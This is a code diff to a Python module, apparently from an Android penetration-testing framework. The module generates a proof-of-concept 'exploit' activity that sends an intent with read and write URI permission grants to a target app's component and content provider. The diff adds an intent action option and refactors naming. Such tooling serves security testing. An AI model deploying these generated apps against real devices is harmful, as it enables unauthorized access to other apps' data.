@@ -24,6 +24,7 @@ class SherlockModule(App):
             OptStr("PROVIDER_URI", [True, "Content provider URI to access"]),
             OptStr("TARGET_PACKAGE", [True, "Target package name"]),
             OptStr("TARGET_CLASS", [True, "Target class name"]),
+            OptStr("ACTION_NAME", [False, "Intent action name"]),
             OptList("PUT_EXTRA", [False, "Intent extra data"]),
             OptEnum("RESULT_CODE", [True, "(Default: -1) Result code returned to the caller", -1, [-1, 0, 1, "RESULT_OK", "RESULT_FIRST_USER", "RESULT_CANCELED"]])
         ])
@@ -40,11 +41,14 @@ class SherlockModule(App):
         provider_uri = opts['PROVIDER_URI']
         target_package = opts['TARGET_PACKAGE']
         target_class = opts['TARGET_CLASS']
+        action_name = opts['ACTION_NAME']
         put_extra = opts['PUT_EXTRA']
         result_code = opts['RESULT_CODE']
 
+        exploit_activity_name = self.activity_name(self._id, target_package)
+
         component = self._template.build_activity(
-            name=self.activity_name(self._id, opts['TARGET_PACKAGE']),
+            name=exploit_activity_name,
             libs=[
                 "android.content.Context",
                 "android.content.Intent",
@@ -65,9 +69,10 @@ class SherlockModule(App):
             ],
             bind_button=True,
             on_create=[self._template.build_intent(
+                set_action=action_name if action_name != "" else None,
                 set_data=f'"{provider_uri}"',
                 set_classname=[target_package, target_class],
-                put_extra=[[extra[0], f'"{extra[1]}"'] for extra in put_extra] if put_extra != "" else [],
+                put_extra=[[extra[0], extra[1]] for extra in put_extra] if put_extra != "" else [],
                 set_flags=["Intent.FLAG_GRANT_READ_URI_PERMISSION", "Intent.FLAG_GRANT_WRITE_URI_PERMISSION"],
                 start_activity=False,
                 start_for_result=True
@@ -84,13 +89,13 @@ class SherlockModule(App):
 
         app = {
             "manifest": [
-                self._template.build_manifest_component(self.activity_name(self._id, target_package))
+                self._template.build_manifest_component(exploit_activity_name)
             ],
             "layout": self._template.button_layout(self._id, target_package),
             "bind_button": self._template.bind_button(self._id, target_package),
             "component": [
                 {
-                    "name": f"{self.activity_name(self._id, target_package)}.java",
+                    "name": f"{exploit_activity_name}.java",
                     "content": component 
                 }
             ]
